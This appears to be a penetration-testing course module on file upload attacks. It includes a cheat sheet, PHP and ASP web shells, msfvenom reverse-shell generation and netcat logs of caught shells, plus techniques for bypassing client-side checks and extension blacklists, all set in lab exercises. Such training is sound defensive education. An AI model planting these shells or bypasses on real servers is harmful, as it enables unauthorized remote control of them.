@@ -1,0 +1,665 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+<h1 id="19-file-upload-attacks">19. File Upload Attacks</h1>
+<p><strong>Cheat Sheet</strong></p>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="web-shells">Web Shells</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Web Shell</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;?php file_get_contents('/etc/passwd'); ?&gt;</code></td>
+<td>Basic PHP File Read</td>
+</tr>
+<tr>
+<td><code>&lt;?php system('hostname'); ?&gt;</code></td>
+<td>Basic PHP Command Execution</td>
+</tr>
+<tr>
+<td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
+<td>Basic PHP Web Shell</td>
+</tr>
+<tr>
+<td><code>&lt;% eval request('cmd') %&gt;</code></td>
+<td>Basic ASP Web Shell</td>
+</tr>
+<tr>
+<td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
+<td>Generate PHP reverse shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Arrexel/phpbash">PHP Web Shell</a></td>
+<td>PHP Web Shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a></td>
+<td>PHP Reverse Shell</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web/Reverse Shells</a></td>
+<td>List of Web Shells and Reverse Shells</td>
+</tr>
+</tbody>
+</table>
+<h3 id="bypasses">Bypasses</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Client-Side Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>[CTRL+SHIFT+C]</code></td>
+<td>Toggle Page Inspector</td>
+</tr>
+<tr>
+<td><strong>Blacklist Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>shell.phtml</code></td>
+<td>Uncommon Extension</td>
+</tr>
+<tr>
+<td><code>shell.pHp</code></td>
+<td>Case Manipulation</td>
+</tr>
+<tr>
+<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Extensions</a></td>
+<td>List of PHP Extensions</td>
+</tr>
+<tr>
+<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">ASP Extensions</a></td>
+<td>List of ASP Extensions</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a></td>
+<td>List of Web Extensions</td>
+</tr>
+<tr>
+<td><strong>Whitelist Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>shell.jpg.php</code></td>
+<td>Double Extension</td>
+</tr>
+<tr>
+<td><code>shell.php.jpg</code></td>
+<td>Reverse Double Extension</td>
+</tr>
+<tr>
+<td><code>%20</code>, <code>%0a</code>, <code>%00</code>, <code>%0d0a</code>, <code>/</code>, <code>.\</code>, <code>.</code>, <code>…</code></td>
+<td>Character Injection - Before/After Extension</td>
+</tr>
+<tr>
+<td><strong>Content/Type Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">Web Content-Types</a></td>
+<td>List of Web Content-Types</td>
+</tr>
+<tr>
+<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Types</a></td>
+<td>List of All Content-Types</td>
+</tr>
+<tr>
+<td><a href="https://en.wikipedia.org/wiki/List\_of\_file\_signatures">File Signatures</a></td>
+<td>List of File Signatures/Magic Bytes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="limited-uploads">Limited Uploads</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Potential Attack</strong></th>
+<th><strong>File Types</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>XSS</code></td>
+<td>HTML, JS, SVG, GIF</td>
+</tr>
+<tr>
+<td><code>XXE</code>/<code>SSRF</code></td>
+<td>XML, SVG, PDF, PPT, DOC</td>
+</tr>
+<tr>
+<td><code>DoS</code></td>
+<td>ZIP, JPG, PNG</td>
+</tr>
+</tbody>
+</table>
+<h2 id="intro-to-file-upload-attacks">Intro to File Upload Attacks</h2>
+<hr>
+<p>Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.</p>
+<p>However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.</p>
+<p>File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as we can see in the latest <a href="https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html">CVE Reports</a>. We will also notice that most of these vulnerabilities are scored as <code>High</code> or <code>Critical</code> vulnerabilities, showing the level of risk caused by insecure file upload.</p>
+<hr>
+<h3 id="types-of-file-upload-attacks">Types of File Upload Attacks</h3>
+<p>The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an <code>unauthenticated arbitrary file upload</code> vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.</p>
+<p>Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.</p>
+<p>The most common and critical attack caused by arbitrary file uploads is <code>gaining remote command execution</code> over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.</p>
+<p>In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.</p>
+<p>Examples of these attacks include:</p>
+<ul>
+<li>Introducing other vulnerabilities like <code>XSS</code> or <code>XXE</code>.</li>
+<li>Causing a <code>Denial of Service (DoS)</code> on the back-end server.</li>
+<li>Overwriting critical system files and configurations.</li>
+<li>And many others.</li>
+</ul>
+<p>Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the use of outdated libraries that may be vulnerable to these attacks. At the end of the module, we will go through various tips and practices to secure our web applications against the most common types of file upload attacks, in addition to further recommendations to prevent file upload vulnerabilities that we may miss.</p>
+<h2 id="absent-validation">Absent Validation</h2>
+<hr>
+<p>The most basic type of file upload vulnerability occurs when the web application <code>does not have any form of validation filters</code> on the uploaded files, allowing the upload of any file type by default.</p>
+<p>With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.</p>
+<hr>
+<h3 id="arbitrary-file-upload">Arbitrary File Upload</h3>
+<p>Let's start the exercise at the end of this section, and we will see an <code>Employee File Manager</code> web application, which allows us to upload personal files to the web application:</p>
+<p><img src="storage\modules\136\file\_uploads\_file\_manager.jpg" alt=""></p>
+<p>The web application does not mention anything about what file types are allowed, and we can drag and drop any file we want, and its name will appear on the upload form, including <code>.php</code> files:</p>
+<p><img src="storage\modules\136\file\_uploads\_file\_selected\_php\_file.jpg" alt=""></p>
+<p>Furthermore, if we click on the form to select a file, the file selector dialog does not specify any file type, as it says <code>All Files</code> for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application:</p>
+<p><img src="storage\modules\136\file\_uploads\_file\_selection\_dialog.jpg" alt=""></p>
+<p>All of this tells us that the program appears to have no file type restrictions on the front-end, and if no restrictions were specified on the back-end, we might be able to upload arbitrary file types to the back-end server to gain complete control over it.</p>
+<hr>
+<h3 id="identifying-web-framework">Identifying Web Framework</h3>
+<p>We need to upload a malicious script to test whether we can upload any file type to the back-end server and test whether we can use this to exploit the back-end server. Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a <code>Web Shell</code> script and a <code>Reverse Shell</code> script.</p>
+<p>A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.</p>
+<p>This is usually relatively simple, as we can often see the web page extension in the URLs, which may reveal the programming language that runs the web application. However, in certain web frameworks and web languages, <code>Web Routes</code> are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.</p>
+<p>One easy method to determine what language runs the web application is to visit the <code>/index.ext</code> page, where we would swap out <code>ext</code> with various common web extensions, like <code>php</code>, <code>asp</code>, <code>aspx</code>, among others, to see whether any of them exist.</p>
+<p>For example, when we visit our exercise below, we see its URL as <code>http://SERVER_IP:PORT/</code>, as the <code>index</code> page is usually hidden by default. But, if we try visiting <code>http://SERVER_IP:PORT/index.php</code>, we would get the same page, which means that this is indeed a <code>PHP</code> web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using a <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a> wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.</p>
+<p>Several other techniques may help identify the technologies running the web application, like using the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:</p>
+<p><img src="storage\modules\136\file\_uploads\_wappalyzer.jpg" alt=""></p>
+<p>As we can see, not only did the extension tell us that the web application runs on <code>PHP</code>, but it also identified the type and version of the web server, the back-end operating system, and other technologies in use. These extensions are essential in a web penetration tester's arsenal, though it is always better to know alternative manual methods to identify the web framework, like the earlier method we discussed.</p>
+<p>We may also run web scanners to identify the web framework, like Burp/ZAP scanners or other Web Vulnerability Assessment tools. In the end, once we identify the language running the web application, we may upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.</p>
+<hr>
+<h3 id="vulnerability-identification">Vulnerability Identification</h3>
+<p>Now that we have identified the web framework running the web application and its programming language, we can test whether we can upload a file with the same extension. As an initial test to identify whether we can upload arbitrary <code>PHP</code> files, let's create a basic <code>Hello World</code> script to test whether we can execute <code>PHP</code> code with our uploaded file.</p>
+<p>To do so, we will write <code>&lt;?php echo "Hello HTB";?&gt;</code> to <code>test.php</code>, and try uploading it to the web application:</p>
+<p><img src="storage\modules\136\file\_uploads\_upload\_php.jpg" alt=""></p>
+<p>The file appears to have successfully been uploaded, as we get a message saying <code>File successfully uploaded</code>, which means that <code>the web application has no file validation whatsoever on the back-end</code>. Now, we can click the <code>Download</code> button, and the web application will take us to our uploaded file:</p>
+<p><img src="storage\modules\136\file\_uploads\_hello\_htb.jpg" alt=""></p>
+<p>As we can see, the page prints our <code>Hello HTB</code> message, which means that the <code>echo</code> function was executed to print our string, and we successfully executed <code>PHP</code> code on the back-end server. If the page could not run PHP code, we would see our source code printed on the page.</p>
+<p>In the next section, we will see how to exploit this vulnerability to execute code on the back-end server and take control over it.</p>
+<h2 id="upload-exploitation">Upload Exploitation</h2>
+<hr>
+<p>The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.</p>
+<hr>
+<h3 id="web-shells">Web Shells</h3>
+<p>We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for <code>PHP</code> is <a href="https://github.com/Arrexel/phpbash">phpbash</a>, which provides a terminal-like, semi-interactive web shell. Furthermore, <a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">SecLists</a> provides a plethora of web shells for different frameworks and languages, which can be found in the <code>/opt/useful/SecLists/Web-Shells</code> directory in <code>PwnBox</code>.</p>
+<p>We can download any of these web shells for the language of our web application (<code>PHP</code> in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload <code>phpbash.php</code> from <a href="https://github.com/Arrexel/phpbash">phpbash</a> to our web application, and then navigate to its link by clicking on the Download button:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_bash.jpg" alt=""></p>
+<p>As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.</p>
+<hr>
+<h3 id="writing-custom-web-shell">Writing Custom Web Shell</h3>
+<p>Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.</p>
+<p>For example, with <code>PHP</code> web applications, we can use the <code>system()</code> function that executes system commands and prints their output, and pass it the <code>cmd</code> parameter with <code>$_REQUEST['cmd']</code>, as follows:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span> system($_REQUEST[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>If we write the above script to <code>shell.php</code> and upload it to our web application, we can execute system commands with the <code>?cmd=</code> GET parameter (e.g. <code>?cmd=id</code>), as follows:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<p>This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.</p>
+<p>Tip: If we are using this custom web shell in a browser, it may be best to use source-view by clicking <code>[CTRL+U]</code>, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.</p>
+<p>Web shells are not exclusive to <code>PHP</code>, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For <code>.NET</code> web applications, we can pass the <code>cmd</code> parameter with <code>request('cmd')</code> to the <code>eval()</code> function, and it should also execute the command specified in <code>?cmd=</code> and print its output, as follows:</p>
+<p>Code: asp</p>
+<pre><code class="lang-asp"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> <span class="hljs-keyword">eval</span> request(<span class="hljs-string">'cmd'</span>) </span><span class="xml"><span class="hljs-tag">%&gt;</span></span>
+</code></pre>
+<p>We can find various other web shells online, many of which can be easily memorized for web penetration testing purposes. It must be noted that <code>in certain cases, web shells may not work</code>. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. <code>system()</code>), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.</p>
+<hr>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>Finally, let's see how we can receive reverse shells through the vulnerable upload functionality. To do so, we should start by downloading a reverse shell script in the language of the web application. One reliable reverse shell for <code>PHP</code> is the <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a> PHP reverse shell. Furthermore, the same <a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">SecLists</a> we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.</p>
+<p>Let's download one of the above reverse shell scripts, like the <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a>, and then open it in a text editor to input our <code>IP</code> and listening <code>PORT</code>, which the script will connect to. For the <code>pentestmonkey</code> script, we can modify lines <code>49</code> and <code>50</code> and input our machine's IP/PORT:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-variable">$ip</span> = <span class="hljs-string">'OUR_IP'</span>;     <span class="hljs-regexp">//</span> CHANGE THIS
+<span class="hljs-variable">$port</span> = OUR_PORT;   <span class="hljs-regexp">//</span> CHANGE THIS
+</code></pre>
+<p>Next, we can start a <code>netcat</code> listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:</p>
+<p>Upload Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp OUR_PORT
+listening on [any] OUR_PORT ...
+connect to [OUR_IP] from (UNKNOWN) [<span class="hljs-number">188.166</span><span class="hljs-number">.173</span><span class="hljs-number">.208</span>] <span class="hljs-number">35232</span>
+# id
+uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)
+</code></pre>
+<p>As we can see, we successfully received a connection back from the back-end server that hosts the vulnerable web application, which allows us to interact with it for further exploitation. The same concept can be used for other web frameworks and languages, with the only difference being the reverse shell script we use.</p>
+<hr>
+<h3 id="generating-custom-reverse-shell-scripts">Generating Custom Reverse Shell Scripts</h3>
+<p>Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previous <code>system</code> function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.</p>
+<p>This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools like <code>msfvenom</code> can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows for <code>PHP</code>:</p>
+<p>Upload Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -<span class="hljs-selector-tag">p</span> php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse<span class="hljs-selector-class">.php</span>
+..<span class="hljs-selector-class">.SNIP</span>...
+Payload size: <span class="hljs-number">3033</span> bytes
+</code></pre>
+<p>Once our <code>reverse.php</code> script is generated, we can once again start a <code>netcat</code> listener on the port we specified above, upload the <code>reverse.php</code> script and visit its link, and we should receive a reverse shell as well:</p>
+<p>Upload Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp OUR_PORT
+listening on [any] OUR_PORT ...
+connect to [OUR_IP] from (UNKNOWN) [<span class="hljs-number">181.151</span><span class="hljs-number">.182</span><span class="hljs-number">.286</span>] <span class="hljs-number">56232</span>
+# id
+uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)
+</code></pre>
+<p>Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the <code>-p</code> flag and specify the output language with the <code>-f</code> flag.</p>
+<p>While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.</p>
+<h2 id="client-side-validation">Client-Side Validation</h2>
+<hr>
+<p>Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).</p>
+<p>However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.</p>
+<hr>
+<h3 id="client-side-validation">Client-Side Validation</h3>
+<p>The exercise at the end of this section shows a basic <code>Profile Image</code> functionality, frequently seen in web applications that utilize user profile features, like social media web applications:</p>
+<p><img src="storage\modules\136\file\_uploads\_profile\_image\_upload.jpg" alt=""></p>
+<p>However, this time, when we get the file selection dialog, we cannot see our <code>PHP</code> scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:</p>
+<p><img src="storage\modules\136\file\_uploads\_select\_file\_types.jpg" alt=""></p>
+<p>We may still select the <code>All Files</code> option to select our <code>PHP</code> script anyway, but when we do so, we get an error message saying (<code>Only images are allowed!</code>), and the <code>Upload</code> button gets disabled:</p>
+<p><img src="storage\modules\136\file\_uploads\_select\_denied.jpg" alt=""></p>
+<p>This indicates some form of file type validation, so we cannot just upload a web shell through the upload form as we did in the previous section. Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file. So, we should be able to have complete control over these client-side validations.</p>
+<p>Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.</p>
+<p>As mentioned earlier, to bypass these protections, we can either <code>modify the upload request to the back-end server</code>, or we can <code>manipulate the front-end code to disable these type validations</code>.</p>
+<hr>
+<h3 id="back-end-request-modification">Back-end Request Modification</h3>
+<p>Let's start by examining a normal request through <code>Burp</code>. When we select an image, we see that it gets reflected as our profile image, and when we click on <code>Upload</code>, our profile image gets updated and persists through refreshes. This indicates that our image was uploaded to the server, which is now displaying it back to us:</p>
+<p><img src="storage\modules\136\file\_uploads\_normal\_request.jpg" alt=""></p>
+<p>If we capture the upload request with <code>Burp</code>, we see the following request being sent by the web application:</p>
+<p><img src="storage\modules\136\file\_uploads\_image\_upload\_request.jpg" alt=""></p>
+<p>The web application appears to be sending a standard HTTP upload request to <code>/upload.php</code>. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.</p>
+<p>The two important parts in the request are <code>filename="HTB.png"</code> and the file content at the end of the request. If we modify the <code>filename</code> to <code>shell.php</code> and modify the content to the web shell we used in the previous section; we would be uploading a <code>PHP</code> web shell instead of an image.</p>
+<p>So, let's capture another image upload request, and then modify it accordingly:</p>
+<p><img src="storage\modules\136\file\_uploads\_modified\_upload\_request.jpg" alt=""></p>
+<p>Note: We may also modify the <code>Content-Type</code> of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.</p>
+<p>As we can see, our upload request went through, and we got <code>File successfully uploaded</code> in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.</p>
+<hr>
+<h3 id="disabling-front-end-validation">Disabling Front-end Validation</h3>
+<p>Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them. So, we can modify these scripts or disable them entirely. Then, we may use the upload functionality to upload any file type without needing to utilize <code>Burp</code> to capture and modify our requests.</p>
+<p>To start, we can click [<code>CTRL+SHIFT+C</code>] to toggle the browser's <code>Page Inspector</code>, and then click on the profile image, which is where we trigger the file selector for the upload form:</p>
+<p><img src="storage\modules\136\file\_uploads\_element\_inspector.jpg" alt=""></p>
+<p>This will highlight the following HTML file input on line <code>18</code>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"uploadFile"</span> id=<span class="hljs-string">"uploadFile"</span> onchange=<span class="hljs-string">"checkFile(this)"</span> <span class="hljs-keyword">accept</span>=<span class="hljs-string">".jpg,.jpeg,.png"</span>&gt;
+</code></pre>
+<p>Here, we see that the file input specifies (<code>.jpg,.jpeg,.png</code>) as the allowed file types within the file selection dialog. However, we can easily modify this and select <code>All Files</code> as we did before, so it is unnecessary to change this part of the page.</p>
+<p>The more interesting part is <code>onchange="checkFile(this)"</code>, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser's <code>Console</code> by clicking [<code>CTRL+SHIFT+K</code>], and then we can type the function's name (<code>checkFile</code>) to get its details:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">File</span>) </span>{
+...SNIP...
+    if (extension !== <span class="hljs-string">'jpg'</span> &amp;&amp; extension !== <span class="hljs-string">'jpeg'</span> &amp;&amp; extension !== <span class="hljs-string">'png'</span>) {
+        $(<span class="hljs-string">'#error_message'</span>).text(<span class="hljs-string">"Only images are allowed!"</span>);
+        File.form.reset();
+        $(<span class="hljs-string">"#submit"</span>).attr(<span class="hljs-string">"disabled"</span>, <span class="hljs-literal">true</span>);
+    ...SNIP...
+    }
+}
+</code></pre>
+<p>The key thing we take from this function is where it checks whether the file extension is an image, and if it is not, it prints the error message we saw earlier (<code>Only images are allowed!</code>) and disables the <code>Upload</code> button. We can add <code>PHP</code> as one of the allowed extensions or modify the function to remove the extension check.</p>
+<p>Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.</p>
+<p>To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (<code>checkFile</code>) on line <code>18</code>, and delete it:</p>
+<p><img src="storage\modules\136\file\_uploads\_removed\_js\_function.jpg" alt=""></p>
+<p>Tip: You may also do the same to remove <code>accept=".jpg,.jpeg,.png"</code>, which should make selecting the <code>PHP</code> shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.</p>
+<p>With the <code>checkFile</code> function removed from the file input, we should be able to select our <code>PHP</code> web shell through the file selection dialog and upload it normally with no validations, similar to what we did in the previous section.</p>
+<p>Note: The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose.</p>
+<p>Once we upload our web shell using either of the above methods and then refresh the page, we can use the <code>Page Inspector</code> once more with [<code>CTRL+SHIFT+C</code>], click on the profile image, and we should see the URL of our uploaded web shell:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;img src=<span class="hljs-string">"/profile_images/shell.php"</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">"profile-image"</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">"profile-image"</span>&gt;
+</code></pre>
+<p>If we can click on the above link, we will get to our uploaded web shell, which we can interact with to execute commands on the back-end server:</p>
+<p><img src="storage\modules\136\file\_uploads\_php\_manual\_shell.jpg" alt=""></p>
+<p>Note: The steps shown apply to Firefox, as other browsers may have slightly different methods for applying local changes to the source, like the use of <code>overrides</code> in Chrome.</p>
+<h2 id="blacklist-filters">Blacklist Filters</h2>
+<hr>
+<p>In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.</p>
+<p>Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.</p>
+<p>The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.</p>
+<hr>
+<h3 id="blacklisting-extensions">Blacklisting Extensions</h3>
+<p>Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:</p>
+<p><img src="storage\modules\136\file\_uploads\_disallowed\_type.jpg" alt=""></p>
+<p>As we can see, our attack did not succeed this time, as we got <code>Extension not allowed</code>. This indicates that the web application may have some form of file type validation on the back-end, in addition to the front-end validations.</p>
+<p>There are generally two common forms of validating a file extension on the back-end:</p>
+<ol>
+<li>Testing against a <code>blacklist</code> of types</li>
+<li>Testing against a <code>whitelist</code> of types</li>
+</ol>
+<p>Furthermore, the validation may also check the <code>file type</code> or the <code>file content</code> for type matching. The weakest form of validation amongst these is <code>testing the file extension against a blacklist of extension</code> to determine whether the upload request should be blocked. For example, the following piece of code checks if the uploaded file extension is <code>PHP</code> and drops the request if it is:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">$fileName = basename($_FILES[<span class="hljs-string">"uploadFile"</span>][<span class="hljs-string">"name"</span>]);
+$extension = pathinfo($fileName, PATHINFO_EXTENSION);
+$blacklist = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>, <span class="hljs-string">'php7'</span>, <span class="hljs-string">'phps'</span>);
+
+<span class="hljs-keyword">if</span> (in_array($extension, $blacklist)) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File type not allowed"</span>;
+    <span class="hljs-keyword">die</span>();
+}
+</code></pre>
+<p>The code is taking the file extension (<code>$extension</code>) from the uploaded file name (<code>$fileName</code>) and then comparing it against a list of blacklisted extensions (<code>$blacklist</code>). However, this validation method has a major flaw. <code>It is not comprehensive</code>, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.</p>
+<p>Tip: The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a <code>php</code> with a mixed-case (e.g. <code>pHp</code>), which may bypass the blacklist as well, and should still execute as a PHP script.</p>
+<p>So, let's try to exploit this weakness to bypass the blacklist and upload a PHP file.</p>
+<hr>
+<h3 id="fuzzing-extensions">Fuzzing Extensions</h3>
+<p>As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message. Any upload requests that do not return an error message, return a different message, or succeed in uploading the file, may indicate an allowed file extension.</p>
+<p>There are many lists of extensions we can utilize in our fuzzing scan. <code>PayloadsAllTheThings</code> provides lists of extensions for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP</a> and <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">.NET</a> web applications. We may also use <code>SecLists</code> list of common <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a>.</p>
